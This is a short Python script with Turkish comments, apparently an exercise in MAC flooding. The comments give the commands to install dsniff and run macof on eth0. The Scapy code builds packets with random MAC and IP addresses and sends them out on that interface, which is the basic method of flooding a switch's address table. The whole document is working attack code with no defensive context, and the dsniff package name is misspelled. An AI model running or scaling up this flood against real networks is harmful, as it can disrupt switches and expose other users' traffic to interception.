
# Terminaldeki komutları
# sudo apt install dsinff -y
# macof -i eth0 -n 10


# Scapy script ile macof saldırıs
from scapy.all import *

pckt_list = []

for i in range(10) :
	srcMac = RandMAC()
	dstMac = RandMAC()
	srcIp = RandIP()
	dstIp = RandIP()

	ether = Ether ( src = srcMac , dst =dstMac)
	ip = IP (src = srcIp , dst =dstIp)
	pckt = ether /ip 
	pckt_list.append(pckt)

	print(srcMac, ":" , srcIp , " >> " , dstMac , " :" ,dstIp)


sendp(pckt_list, iface="eth0" , verbose=False)